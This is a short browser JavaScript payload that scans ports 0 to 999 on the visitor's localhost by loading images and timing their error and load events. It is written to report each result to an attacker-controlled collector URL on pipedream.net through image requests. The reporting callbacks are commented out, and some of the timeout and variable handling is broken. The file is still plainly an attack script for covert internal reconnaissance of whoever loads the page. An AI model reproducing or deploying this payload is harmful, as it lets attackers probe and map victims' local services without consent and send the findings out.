var call_back = function (port, status, exfil_host=attacker_host) {
	let img = document.createElement("img");
        img.src = `${exfil_host}/port-${port}-${status}`
}

var check_port = function (target, port, timeout, callback=call_back) {
	
	var timeout = (timeout == null)?100:timeout;
	var img = new Image();
	var timeout = false
	
	img.onerror = function () {
		if (!img || timeout) return;
		img = undefined;
		//callback(port, 'cannot-connect');
	};
	
	img.onload = img.onerror;
	img.src = 'http://' + target + ':' + port;
	
	setTimeout(function () {
		if (!img) return;
		img = undefined;
		//callback(port, 'open');
	}, timeout);
};


var target = 'localhost'
var attacker_host = 'https://a4e8f8fdfa71d7509998751717b20e35.m.pipedream.net'

// usage
for(let i=0; i<1000; i++) {
    check_port('localhost', i, 2);
}
